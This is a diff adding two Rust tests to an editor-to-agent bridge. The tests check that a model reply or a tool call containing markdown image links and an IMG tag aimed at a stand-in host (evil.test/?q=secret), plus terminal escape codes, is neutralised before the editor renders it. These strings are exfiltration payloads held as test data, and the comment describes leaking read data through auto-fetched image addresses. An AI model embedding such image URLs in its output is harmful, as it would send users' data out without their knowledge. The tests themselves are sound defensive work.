@@ -440,6 +440,69 @@ fn a_reply_that_looks_like_a_protocol_message_is_only_text() {
     }
 }
 
+/// An editor draws an image in a message the moment it arrives, so a model that put what it had
+/// read into an image address would send it out with no click. Control characters are pictured as
+/// they are in the terminal.
+#[test]
+fn a_reply_that_would_make_an_editor_fetch_something_is_cut() {
+    if !test_profile::in_isolated_profile() {
+        return;
+    }
+    let said =
+        "see ![](https://evil.test/?q=secret) <IMG src=\"https://evil.test/\">\r\nnext\u{1b}[2J";
+    let reply = format!(
+        "data: {}\n\ndata: [DONE]\n\n",
+        json!({"choices":[{"delta":{"content": said},"finish_reason":"stop"}]})
+    );
+    let project = project("fetching-reply");
+    let (config, _requests, _server) = endpoint::endpoint(vec![reply], None);
+    let mut editor = Editor::on(&config.endpoint, &project);
+    let session = editor.session(&project);
+    let prompt = editor.prompt(&session, text("hello"));
+    editor.answer_next(selected("allow-once"));
+    editor.response(prompt);
+    assert_eq!(
+        editor.texts(),
+        [
+            "see ! [](https://evil.test/?q=secret) < IMG src=\"https://evil.test/\">\nnext\u{241b}[2J"
+        ]
+    );
+}
+
+/// What a question shows is the lines the terminal shows for it, as a code block that nothing in
+/// the content can end, and not the request as the bridge sent it, whose fields hold the whole of
+/// every file.
+#[test]
+fn a_question_is_put_as_words_in_a_block_and_not_as_the_request_the_bridge_sent() {
+    if !test_profile::in_isolated_profile() {
+        return;
+    }
+    let contents = "![x](https://evil.test/?q=1)\n```\nnot a fence end";
+    let model = vec![
+        endpoint::tool(
+            "write_file",
+            json!({"path": "image.md", "contents": contents}),
+        ),
+        endpoint::answer(),
+    ];
+    let project = project("question-text");
+    let (config, _requests, _server) = endpoint::endpoint(model, None);
+    let mut editor = Editor::on(&config.endpoint, &project);
+    let session = editor.session(&project);
+    let prompt = editor.prompt(&session, text("write it"));
+    editor.answer_next(selected("reject-once"));
+    let asked = editor.answer_next(selected("reject-once"));
+    editor.response(prompt);
+    let call = &asked["params"]["toolCall"];
+    assert!(call.get("rawInput").is_none(), "{call:#?}");
+    let shown = call["content"][0]["content"]["text"].as_str().unwrap();
+    assert!(
+        shown.starts_with("````\n") && shown.ends_with("\n````"),
+        "{shown}"
+    );
+    assert!(shown.contains("![x](https://evil.test/?q=1)"), "{shown}");
+}
+
 /// A picture an editor attaches is carried as a pasted one is, and a linked file as a dropped one
 /// is: in a message of its own that the agent's read of it wrote, and not in the typed words.
 #[test]
